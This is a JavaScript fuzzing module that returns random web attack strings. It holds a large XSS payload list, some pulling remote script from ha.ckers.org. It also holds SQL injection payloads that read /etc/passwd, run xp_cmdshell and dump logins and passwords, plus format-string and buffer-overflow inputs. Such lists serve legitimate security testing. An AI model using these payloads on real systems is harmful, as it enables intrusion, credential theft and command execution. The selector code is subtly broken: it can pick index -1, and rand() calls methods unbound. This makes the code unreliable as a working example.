vectorator = function(){
    this.xssVectors = [
        '<SCRIPT>alert(\'XSS\');</SCRIPT>',
        '\'\';!--"<XSS>=&{()}',
        '<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>',
        '<IMG SRC="javascript:alert(\'XSS\');">',
        '<IMG SRC=javascript:alert(\'XSS\')>',
        '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
        '<IMG SRC=javascript:alert(&quot;XSS&quot;)>',
        '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
        '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
        'SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
        '<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>',
        '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>',
        '<IMG SRC="jav   ascript:alert(\'XSS\');">',
        '<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">',
        '<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">',
        '<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">',
        '<IMG SRC=" &#14;  javascript:alert(\'XSS\');">',
        '<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
        '<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>',
        '<IMG SRC="javascript:alert(\'XSS\')"',
        '<SCRIPT>a=/XSS/',
        '\";alert(\'XSS\');//',
        '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">',
        '<BODY BACKGROUND="javascript:alert(\'XSS\')">',
        '<BODY ONLOAD=alert(\'XSS\')>',
        '<IMG DYNSRC="javascript:alert(\'XSS\')">',
        '<IMG LOWSRC="javascript:alert(\'XSS\')">',
        '<BGSOUND SRC="javascript:alert(\'XSS\');">',
        '<BR SIZE="&{alert(\'XSS\')}">',
        '<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>',
        '<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">',
        '<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">',
        '<STYLE>@import\'http://ha.ckers.org/xss.css\';</STYLE>',
        '<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">',
        '<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>',
        '<IMG SRC=\'vbscript:msgbox("XSS")\'>',
        '<IMG SRC="mocha:[code]">',
        '<IMG SRC="livescript:[code]">',
        '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">',
        '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">',
        '<META HTTP-EQUIV="Link" Content="<javascript:alert(\'XSS\')>; REL=stylesheet">',
        '<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(\'XSS\');">',
        '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
        '<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>',
        '<TABLE BACKGROUND="javascript:alert(\'XSS\')">',
        '<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">',
        '<DIV STYLE="background-image: url(&#1;javascript:alert(\'XSS\'))">',
        '<DIV STYLE="width: expression(alert(\'XSS\'));">',
        '<STYLE>@im\\port\'\\ja\\vasc\\ript:alert("XSS")\';</STYLE>',
        '<IMG STYLE="xss:expr\/*XSS*/ession(alert(\'XSS\'))">',
        '<XSS STYLE="xss:expression(alert(\'XSS\'))">',
        'exp\/*<XSS STYLE=\'no\\xss:noxss("*/\/*");',
        '<STYLE TYPE="text/javascript">alert(\'XSS\');</STYLE>',
        '<STYLE>.XSS{background-image:url("javascript:alert(\'XSS\')");}</STYLE><A CLASS=XSS></A>',
        '<STYLE type="text/css">BODY{background:url("javascript:alert(\'XSS\')")}</STYLE>',
        '<BASE HREF="javascript:alert(\'XSS\');//">',
        '<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>',
        '<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert(\'XSS\')></OBJECT>',
        'getURL("javascript:alert(\'XSS\')")',
        'a="get";',
        '<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:alert(\'XSS\');">',
        '<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>',
        '<HTML><BODY>',
        '<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>',
        '<!--#exec cmd="/bin/echo \'<SCRIPT SRC\'"--><!--#exec cmd="/bin/echo \'=http://ha.ckers.org/xss.js></SCRIPT>\'"-->',
        '<? echo(\'<SCR)\';',
        '<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert(\'XSS\')&lt;/SCRIPT&gt;">',
        '<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(\'XSS\');+ADw-/SCRIPT+AD4-',
        '<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
        '<SCRIPT a=">" \'\' SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
        '<SCRIPT "a=\'>\'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
        '<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
        '<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
    ];
    this.sqlVectors = [
        '<>"\'%;)(&+',
        '|',
        '!',
        '?',
        '/',
        '//',
        '/\/*',
        '\'',
        '\' -- ',
        '(',
        ')',
        '*|',
        '*\/*',
        '&',
        '0',
        '031003000270000',
        '0 or 1=1',
        '0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)',
        '0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A',
        '0x77616974666F722064656C61792027303A303A31302700 exec(@s)',
        '1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;',
        '1 or 1=1',
        '1;SELECT%20*',
        '1 waitfor delay \'0:0:10\'--',
        '\'%20or%20\'\'=\'',
        '\'%20or%201=1',
        '\')%20or%20(\'x\'=\'x',
        '\'%20or%20\'x\'=\'x',
        '%20or%20x=x',
        '%20\'sleep%2050\'',
        '%20$(sleep%2050)',
        '%21',
        '23 OR 1=1',
        '%26',
        '%27%20or%201=1',
        '%28',
        '%29',
        '%2A%28%7C%28mail%3D%2A%29%29',
        '%2A%28%7C%28objectclass%3D%2A%29%29',
        '%2A%7C',
        '||6',
        '\'||\'6',
        '(||6)',
        '%7C',
        'a\'',
        'admin\' or \'',
        '\' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));',
        '\' and 1 in (select var from temp)--',
        'anything\' OR \'x\'=\'x',
        '"a"" or 1=1--"',
        'a\' or 1=1--',
        '"a"" or 3=3--"',
        'a\' or 3=3--',
        'a\' or \'a\' = \'a',
        '&apos;%20OR',
        'as',
        'asc',
        'a\' waitfor delay \'0:0:10\'--',
        '\'; begin declare @var varchar(8000) set @var=\':\' select @var=@var+\'+login+\'/\'+password+\' \' from users where login > ',
        'bfilename',
        'char%4039%41%2b%40SELECT',
        'declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)',
        'declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)',
        'declare @q nvarchar (4000) select @q =',
        'declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)',
        'declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) ',
        'declare @s varchar(22) select @s =',
        'declare @s varchar (8000) select @s = 0x73656c65637420404076657273696f6e',
        'delete',
        'desc',
        'distinct',
        '\'||(elt(-3+5,bin(15),ord(10),hex(char(45))))',
        '\'; exec master..xp_cmdshell',
        '\'; exec master..xp_cmdshell \'ping 172.10.1.255\'--',
        'exec(@s)',
        '\'; exec (\'sel\' + \'ect us\' + \'er\')',
        'exec sp',
        '\'; execute immediate \'sel\' || \'ect us\' || \'er\'',
        'exec xp',
        '\'; exec xp_regread',
        '\' group by userid having 1=1--',
        'handler',
        'having',
        '\' having 1=1--',
        'hi or 1=1 --"',
        'hi\' or 1=1 --',
        '"hi"") or (""a""=""a"',
        'hi or a=a',
        'hi\' or \'a\'=\'a',
        'hi\') or (\'a\'=\'a',
        '\'hi\' or \'x\'=\'x\';',
        'insert',
        'like',
        'limit',
        '*(|(mail=*))',
        '*(|(objectclass=*))',
        'or',
        '\' or \'\'=\'',
        ' or 0=0 #"',
        '\' or 0=0 --',
        '\' or 0=0 #',
        '" or 0=0 --',
        'or 0=0 --',
        'or 0=0 #',
        '\' or 1 --\'',
        '\' or 1\/*',
        '; or \'1\'=\'1\'',
        '\' or \'1\'=\'1',
        '\' or \'1\'=\'1\'--',
        '\' or 1=1',
        '\' or 1=1 \/*',
        '\' or 1=1--',
        '\' or 1=1-- ',
        '\'\/**/or\/**/1\/**/=\/**/1',
        '‘ or 1=1 --',
        '" or 1=1--',
        'or 1=1',
        'or 1=1--',
        ' or 1=1 or ""=',
        '\' or 1=1 or \'\'=\'',
        '\' or 1 in (select @@version)--',
        'or%201=1',
        'or%201=1 --',
        '\' or 2 > 1',
        '\' or 2 between 1 and 3',
        '\' or 3=3',
        '‘ or 3=3 --',
        '\' or \'7659\'=\'7659',
        ' or a=a',
        ' or a = a',
        '\' or \'a\'=\'a',
        '\' or a=a--',
        '\') or (\'a\'=\'a',
        '" or "a"="a',
        ') or (a=a',
        'order by',
        '\' or (EXISTS)',
        ' or isNULL(1/0) \/*',
        '" or isNULL(1/0) \/*',
        '\' or \'something\' like \'some%\'',
        '\' or \'something\' = \'some\'+\'thing\'',
        '\' or \'text\' = n\'text\'',
        '\' or \'text\' > \'t\'',
        '\' or uid like \'%',
        '\' or uname like \'%',
        '\' or \'unusual\' = \'unusual\'',
        '\' or userid like \'%',
        '\' or user like \'%',
        '\' or username like \'%',
        '\' or username like char(37);',
        '\' or \'whatever\' in (\'whatever\')',
        '\' -- &password=',
        'password:*/=1--',
        'PRINT',
        'PRINT @@variable',
        'procedure',
        'replace',
        'select',
        '\' select * from information_schema.tables--',
        '\' select name from syscolumns where id = (select id from sysobjects where name = tablename\')--',
        '\' (select top 1',
        '--sp_password',
        '\'sqlattempt1',
        '(sqlattempt2)',
        '\'sqlvuln',
        '\'+sqlvuln',
        '(sqlvuln)',
        'sqlvuln;',
        't\'exec master..xp_cmdshell \'nslookup www.google.com\'--',
        'to_timestamp_tz',
        'truncate',
        'tz_offset',
        '\' UNION ALL SELECT',
        '\' union all select @@version--',
        '\' union select ',
        'uni\/**/on sel\/**/ect',
        '\' UNION SELECT',
        '\' union select 1,load_file(\'/etc/passwd\'),1,1,1;',
        ') union select * from information_schema.tables;',
        '\' union select * from users where login = char(114,111,111,116);',
        'update',
        '\'||UTL_HTTP.REQUEST',
        ',@variable',
        '@variable',
        '@var select @var as var into temp end --',
        '\\x27UNION SELECT',
        'x\' AND 1=(SELECT COUNT(*) FROM tabname); --',
        'x\' AND email IS NULL; --',
        'x\' AND members.email IS NULL; --',
        'x\' AND userid IS NULL; --',
        'x\' or 1=1 or \'x\'=\'y',
        'x\' OR full_name LIKE \'%Bob%',
        'ý or 1=1 --',
    ];
    this.fstringVectors = [
        '%s%p%x%d',
        '%p%p%p%p',
        '%x%x%x%x',
        '%d%d%d%d',
        '%s%s%s%s',
        '%99999999999s',
        '%08x',
        '%20d',
        '%20n',
        '%20x',
        '%20s',
        '%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d',
        '%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i',
        '%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o',
        '%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u',
        '%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x',
        '%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X',
        '%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a',
        '%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A',
        '%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e',
        '%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E',
        '%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f',
        '%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F',
        '%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g',
        '%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G',
        '%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s',
        '%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p',
        '%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%',
        'XXXXX.%p',
        'XXXXX' + new Array(80).join('.%p'),
        new Array(80).join('.%p') + '%n',
        '%08x.%08x.%08x.%08x.%08x\\n',
        'XXX0_%08x.%08x.%08x.%08x.%08x\\n',
        '%.16705u%2\$hn',
        '\\x10\\x01\\x48\\x08_%08x.%08x.%08x.%08x.%08x|%s|',
        'AAAAA%c',
        'AAAAA%d',
        'AAAAA%e',
        'AAAAA%f',
        'AAAAA%I',
        'AAAAA%o',
        'AAAAA%p',
        'AAAAA%s',
        'AAAAA%x',
        'AAAAA%n',
        'ppppp%c',
        'ppppp%d',
        'ppppp%e',
        'ppppp%f',
        'ppppp%I',
        'ppppp%o',
        'ppppp%p',
        'ppppp%s',
        'ppppp%x',
        'ppppp%n',
        '%@',
        '%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@%@',
    ];
    this.bofVectors = (function(){
    var arr = [];
    var newVector = (function(){var b=new function(){this.l=[255,256,257,420,511,512,1023,1024,2047,2048,4096,4097,5E3,1E4,2E4,3E4,32762,32763,32764,32765,32766,32767,32768,4E4,65534,65535,65536];this.m="A %x %n %s %s%n%x%d %99999999999s %99999999999d %99999999999x %99999999999n %08x %%20s %%20x %%20n %%20d".split(" ");this.s="%.1024d %.2048d %.4096d %.8200d %99999999999s %99999999999d %99999999999x %99999999999n %#0123456x%08x%x%s%p%n%d%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%#0123456x%%x%%s%%p%%n%%d%%o%%u%%c%%h%%l%%q%%j%%z%%Z%%t%%i%%e%%g%%f%%a%%C%%S%%08x".split(" ");
this.f=this.s.length+this.m.length;this.g=function(a){return a<=this.m.length?Array(this.l[Math.floor(Math.random()*this.l.length)]).join(this.m[a]):this.s[a]};this.fz=function(){return this.g(Math.floor(Math.random()*this.f))}};return function(){return b.fz()}})();

for(var i = 0; i < 500; i++){
arr.push(newVector());
}
return arr;
})();
    this.OSCIVectors = [];
    this.xss = function(){
        return this.xssVectors[Math.floor(Math.random()*this.xssVectors.length-1)];
    };
    this.SQL = function(){
       return this.sqlVectors[Math.floor(Math.random()*this.sqlVectors.length-1)];
    }
    this.fstring = function(){
        return this.fstringVectors[Math.floor(Math.random()*this.fstringVectors.length-1)];
    };
    this.bof = function(){
       return this.bofVectors[Math.floor(Math.random()*this.bofVectors.length-1)];
    };
    this.rand = function(){
        var methods = {
            "bof": this.bof,
            "SQL": this.SQL,
            "fstring": this.fstring,
            "xss": this.xss,
        };
        var randMethod = [
        "bof",
        "SQL",
        "fstring",
        "xss"
        ];
        return methods[randMethod[Math.floor(Math.random()*4)]]();
    };
}
module.exports = vectorator;